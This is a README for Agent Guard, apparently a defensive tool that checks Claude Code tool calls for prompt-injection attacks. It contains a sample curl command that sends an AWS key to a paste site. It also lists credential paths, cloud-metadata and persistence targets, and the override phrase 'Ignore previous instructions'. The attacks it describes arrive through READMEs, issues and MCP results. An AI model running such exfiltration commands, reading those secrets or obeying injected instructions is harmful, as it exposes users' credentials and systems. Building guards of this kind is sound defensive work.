# Agent Guard

[![CI](https://github.com/defi0x1/agent-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/defi0x1/agent-guard/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

**A seatbelt for Claude Code.** One line hidden in a README, issue or MCP result can tell
Claude to steal your keys. Agent Guard checks every tool call first.

```
$ curl --data AKIAZ7QK3M9XW2PL4RTB https://paste.ee/api/v1/pastes
Agent Guard: risky, please confirm. Your AWS access key (AKIA...4RTB) is being sent to paste.ee.
```

## What it stops

| | Problem | Agent Guard |
|---|---|---|
| 🔑 | Keys sent to a stranger | 🔴 asks you |
| 📂 | Reading `~/.ssh`, `~/.aws`, `.env`, browser data | 🔴 asks you |
| 📤 | Uploads to paste sites, webhooks, raw IPs | 🔴 asks you |
| ☁️ | Cloud metadata (`169.254.169.254`) | 🔴 asks you |
| 🪝 | Backdoors in `~/.zshrc`, cron, `authorized_keys`, git hooks | 🔴 asks you |
| 📥 | `curl ... \| sh` | 🟡 warns |
| 🧪 | Hidden instructions in web and MCP results | 🧹 stripped |
| 🔓 | Claude turning the guard off | ⛔ refused |

Normal work (builds, tests, git, docs) runs with no prompts. Local, ~10 ms per call, no account.

## Install

```sh
curl -fsSL https://raw.githubusercontent.com/defi0x1/agent-guard/main/install.sh | sh
guard install
```

Restart Claude Code. Your status line shows `agent guard: On  ● 0 ● 2 ● 41` (red, yellow, green today).

## Commands

```sh
guard top                  # live view of every call
guard whitelist docs.rs    # a domain you trust stops warning
guard off / guard on       # only you can run these
guard report               # what was flagged today
guard doctor --fix all     # check and fix your setup
```

More: `guard --help`.

## Strictness

`guard level relaxed | recommended | strict` (default: recommended). The 🔴 rows above ask at every level.

| | relaxed | recommended | strict |
|---|---|---|---|
| `curl ... \| sh` | 🟡 | 🟡 | 🔴 |
| Repo with its own git hooks | log only | 🟡 | 🔴 |
| "Ignore previous instructions" in a result | log only | 🟡 | 🟡 |
| Session read web + private data, then sends out | log only | 🟡 | 🔴 |
| Reading `.env` | log only | log only | 🟡 |

## Hardened mode

`sudo guard install --hardened` locks it in root-owned settings with Claude Code's sandbox:
secret files and unknown hosts are refused, not asked, and nothing Claude runs can undo it.
Git over SSH and the aws CLI won't work inside it.

## Good to know

- It's a seatbelt, not a sandbox: a clever attacker can still hide a command. Hardened mode closes most of that.
- Checks Claude Code only. macOS and Linux.
- If the `guard` binary breaks, every tool call is blocked. Reinstall with the line above.

[Threat model](THREAT_MODEL.md) · [Security](SECURITY.md) · [MIT](LICENSE)
